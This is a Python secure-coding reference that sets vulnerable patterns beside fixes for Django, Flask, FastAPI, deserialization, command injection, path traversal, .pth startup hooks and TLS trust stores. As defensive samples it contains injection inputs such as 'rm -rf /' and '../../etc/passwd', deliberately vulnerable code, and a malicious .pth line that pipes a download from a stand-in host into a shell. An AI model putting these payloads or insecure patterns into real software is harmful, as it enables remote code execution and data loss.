# Python Security Patterns

## Dangerous Functions (NEVER use with untrusted input)

| Function | Risk | CWE | Severity | Safe Alternative |
|----------|------|-----|----------|-----------------|
| `eval()` | Arbitrary code execution | CWE-94 | Critical | `ast.literal_eval()` |
| `exec()` | Arbitrary code execution | CWE-94 | Critical | Restricted sandbox or avoid entirely |
| `pickle.loads()` / `pickle.load()` | Deserialization RCE (Bandit B301) | CWE-502 | Critical | `json.loads()`, `msgpack`, or sign pickles with HMAC |
| `subprocess.call(shell=True)` | Command injection | CWE-78 | Critical | `subprocess.call([...], shell=False)` with list args |
| `os.system()` | Command injection | CWE-78 | Critical | `subprocess.run([...], shell=False)` |
| `yaml.load(data)` | Arbitrary code execution | CWE-502 | Critical | `yaml.safe_load(data)` |
| `marshal.loads()` | Code execution via bytecode | CWE-502 | Critical | `json.loads()` |
| `shelve.open()` | Pickle-based deserialization | CWE-502 | High | JSON file storage |
| `__import__(user_input)` | Arbitrary module loading | CWE-94 | Critical | Allowlist of module names |
| `compile()` + `exec()` | Arbitrary code execution | CWE-94 | Critical | Avoid with untrusted input |
| `input()` (Python 2) | Calls `eval()` internally | CWE-94 | Critical | `raw_input()` in Python 2, or migrate to Python 3 |
| `tempfile.mktemp()` | Race condition (TOCTOU) | CWE-377 | Medium | `tempfile.mkstemp()` or `tempfile.NamedTemporaryFile()` |
| `os.path.join(base, user_input)` | Path traversal if input starts with `/` | CWE-22 | High | Validate input, use `PurePath().is_relative_to()` |

## Framework-Specific Vulnerabilities

### Django

| Pattern | Risk | Severity | Fix |
|---------|------|----------|-----|
| `mark_safe(user_input)` | XSS: marks string as safe HTML | Critical | Never use with untrusted input; use template auto-escaping |
| `Model.objects.raw(query)` | SQL injection | Critical | Use parameterized queries: `raw(query, [params])` |
| `.extra(where=[user_input])` | SQL injection | Critical | Use `.filter()` with Q objects instead |
| `DEBUG = True` in production | Information disclosure | High | Set `DEBUG = False` and configure `ALLOWED_HOSTS` |
| `ALLOWED_HOSTS = ['*']` | Host header injection | Medium | List specific hostnames |
| `SECRET_KEY` hardcoded | Session forgery, CSRF bypass | Critical | Load from environment variable |
| `csrf_exempt` decorator | CSRF bypass | High | Remove or use only for genuine API endpoints with token auth |
| `JsonResponse` with user objects | Sensitive data exposure | Medium | Serialize explicitly, exclude sensitive fields |

```python
# VULNERABLE: Django raw SQL
def search(request):
    query = request.GET.get('q')
    results = User.objects.raw(f"SELECT * FROM users WHERE name = '{query}'")  # SQL injection

# SECURE: Parameterized query
def search(request):
    query = request.GET.get('q')
    results = User.objects.raw("SELECT * FROM users WHERE name = %s", [query])

# VULNERABLE: mark_safe with user input
from django.utils.safestring import mark_safe
def render_bio(request):
    bio = request.POST.get('bio')
    return HttpResponse(mark_safe(bio))  # XSS

# SECURE: Let Django auto-escape in templates
# In template: {{ bio }}  (auto-escaped by default)
```

### Flask

| Pattern | Risk | Severity | Fix |
|---------|------|----------|-----|
| `app.run(debug=True)` in production | Debugger RCE (Werkzeug PIN bypass) | Critical | Never enable debug in production |
| `send_file(user_path)` | Path traversal, arbitrary file read | Critical | Use `send_from_directory()` with safe base path |
| `render_template_string(user_input)` | Server-side template injection (SSTI) | Critical | Use `render_template()` with file-based templates |
| No `SECRET_KEY` or weak key | Session forgery | Critical | Generate strong random key |

```python
# VULNERABLE: Flask SSTI
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    return render_template_string(f'Hello {name}!')  # SSTI: name={{config}}

# SECURE: Use template parameters
@app.route('/hello')
def hello():
    name = request.args.get('name', 'World')
    return render_template_string('Hello {{ name }}!', name=name)

# VULNERABLE: Path traversal via send_file
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_file(f'/uploads/{filename}')  # Traversal: file=../../etc/passwd

# SECURE: Use send_from_directory
@app.route('/download')
def download():
    filename = request.args.get('file')
    return send_from_directory('/uploads', filename)
```

### FastAPI

| Pattern | Risk | Severity | Fix |
|---------|------|----------|-----|
| Raw SQL strings with f-strings | SQL injection | Critical | Use ORM or parameterized queries |
| Missing `Depends()` auth on routes | Unauthorized access | High | Add dependency injection for auth |
| `response_model` omitted | Data leakage (extra fields) | Medium | Always define `response_model` |

```python
# VULNERABLE: FastAPI with raw SQL
@app.get("/users/{user_id}")
async def get_user(user_id: str):
    query = f"SELECT * FROM users WHERE id = '{user_id}'"  # SQL injection
    result = await database.fetch_one(query)
    return result

# SECURE: Parameterized query
@app.get("/users/{user_id}")
async def get_user(user_id: int):  # Type validation via path parameter
    query = "SELECT * FROM users WHERE id = :id"
    result = await database.fetch_one(query, values={"id": user_id})
    return result
```

## Common Anti-Patterns

### Deserialization

```python
# VULNERABLE: Pickle from untrusted source
import pickle
data = pickle.loads(request.body)  # RCE via crafted pickle

# SECURE: Use JSON
import json
data = json.loads(request.body)

# VULNERABLE: YAML unsafe load
import yaml
config = yaml.load(user_uploaded_file)  # Arbitrary code execution

# SECURE: YAML safe load
config = yaml.safe_load(user_uploaded_file)
```

### Command Injection

```python
# VULNERABLE: Shell injection
import subprocess
filename = request.args.get('file')
subprocess.call(f'cat {filename}', shell=True)  # file=; rm -rf /

# SECURE: List arguments, no shell
subprocess.call(['cat', filename], shell=False)

# VULNERABLE: os.system
os.system(f'convert {input_file} {output_file}')

# SECURE: subprocess with list
subprocess.run(['convert', input_file, output_file], check=True)
```

### Path Traversal

```python
# VULNERABLE: Path traversal
import os
base = '/var/uploads'
filename = request.args.get('file')
path = os.path.join(base, filename)  # filename = "../../etc/passwd" works!
with open(path) as f:
    return f.read()

# SECURE: Resolve and validate
from pathlib import Path
base = Path('/var/uploads').resolve()
requested = (base / filename).resolve()
if not requested.is_relative_to(base):  # Python 3.9+
    raise ValueError("Path traversal detected")
with open(requested) as f:
    return f.read()
```

### Insecure Randomness

```python
# VULNERABLE: Predictable tokens
import random
token = ''.join(random.choices('abcdef0123456789', k=32))

# SECURE: Cryptographic randomness
import secrets
token = secrets.token_hex(32)
```

## Dependency Risks

| Package | Risk | Details |
|---------|------|---------|
| `requests` with `verify=False` or `verify=<stale bundle path>` | MITM attacks | See "TLS Trust Stores" below |
| `paramiko` (old versions) | Known CVEs (match via feed/OSV, not memory) | Keep updated; avoid password auth without rate limiting |
| `pyyaml` with `yaml.load()` | RCE via YAML deserialization | Always use `yaml.safe_load()` |
| `Jinja2` with `autoescape=False` | XSS in templates | Set `autoescape=True` (default in Flask, not standalone) |
| `cryptography` (old versions) | Known CVEs (match via feed/OSV) | Keep updated |
| `pillow` (older versions) | Image parsing buffer overflows | Keep updated; validate image dimensions |
| `lxml` with `resolve_entities=True` | XXE attacks | Use `defusedxml` or disable entity resolution |
| `setuptools` / `pip` | Typosquatting risk | Verify package names before installing |

## Startup Hooks: `.pth` and `sitecustomize` (T1546.018)

Python's `site` module executes every line starting with `import` in `site-packages/*.pth`, and
imports `sitecustomize.py` and `usercustomize.py`, at **every interpreter start**. Malware there
runs without the victim importing the package. Full check table and safe-list of generated `.pth`
names: `threat-intelligence.md` (T1546.018).

```python
# VULNERABLE (malicious): setup.py / build backend that installs an executing .pth
from setuptools import setup
setup(name="helper", data_files=[("", ["helper_init.pth"])])
# helper_init.pth:  import os; os.system("curl -s https://x.example/p | sh")

# VULNERABLE (malicious): package ships sitecustomize.py at the top level of the wheel
# wheel RECORD lists: sitecustomize.py, helper/__init__.py

# SAFE: .pth that only adds a path (no "import" line)
# helper.pth:  /opt/helper/lib
```

- **Report when** a package, wheel, sdist, `pyproject` build hook or Dockerfile places a `.pth` with an `import` line that does more than load a known editable-install finder, or ships `sitecustomize.py`/`usercustomize.py`. CRITICAL.
- **Skip when** the file is `distutils-precedence.pth` (setuptools), `__editable__.*.pth` (PEP 660), or `_virtualenv.pth`, and its content matches that tool.
- **Response order (LiteLLM case):** do not run `pip` or `python` before deleting the files; any interpreter start re-runs the payload (D§11: https://docs.litellm.ai/blog/security-incident-oct-21-2026).

## TLS Trust Stores (pip, certifi, custom bundles)

`pip` vendors its own copy of `certifi`, so upgrading `certifi` does not change what pip trusts;
pip itself must be upgraded (D§5: https://discuss.python.org/t/information-for-python-users-regarding-emudhra-emsign-ca-certificate-security-incident/109576/).
Any application that pins or vendors a CA bundle freezes its trust decisions at that moment.

| Check | Report when | Skip when | Severity |
|---|---|---|---|
| Vendored bundle | Repo contains `cacert.pem`, `ca-bundle.crt` or a copied `certifi/` directory used by the app | Test fixtures for TLS tests that are never used by real clients | MEDIUM; HIGH if the client downloads code, packages or updates |
| Custom `verify=` path | `requests`/`httpx` `verify="path/to/bundle.pem"`, `ssl.create_default_context(cafile=...)`, `REQUESTS_CA_BUNDLE`, `SSL_CERT_FILE`, `PIP_CERT`, `pip.conf` `cert =` pointing at a repo file | Points at the OS store or a private CA file for an internal service only | MEDIUM |
| Disabled verification | `verify=False`, `ssl._create_unverified_context()`, `CERT_NONE`, `check_hostname = False` | Local-only test code against localhost | HIGH |
| Old bundled pip | Dockerfiles or CI using `python:3.11`/`3.12` images (they keep old pip by policy) and installing without upgrading pip first | `python -m pip install --upgrade pip` first, or `uv` | MEDIUM |

```python
# VULNERABLE: frozen vendored bundle for a package download
requests.get(plugin_url, verify="vendor/certs/cacert.pem")
# SAFE: system trust store (patched by OS updates), or default certifi kept current
import truststore; truststore.inject_into_ssl()
requests.get(plugin_url)
```

Version floors for pip, certifi, uv and conda live in the feed. Do not advise secret rotation for a
trust-store finding alone (D§5).

### Scanning Tools

```bash
# Check for known vulnerabilities in dependencies
pip-audit
safety check

# Static analysis for security issues
bandit -r ./project/
semgrep --config=p/python
```
